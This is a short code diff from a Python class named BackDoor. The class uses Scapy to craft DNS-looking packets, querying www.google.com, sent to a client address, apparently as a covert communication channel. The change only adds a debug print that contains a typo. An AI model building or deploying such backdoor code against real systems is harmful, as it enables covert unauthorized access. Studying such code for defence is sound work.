@@ -24,6 +24,7 @@ class BackDoor:
         print("Starting")
         self.sniff_init()
     def craft_packet(self, msg: str):
+        print(f"{self.client} is the clioent")
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.client_port)
         dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
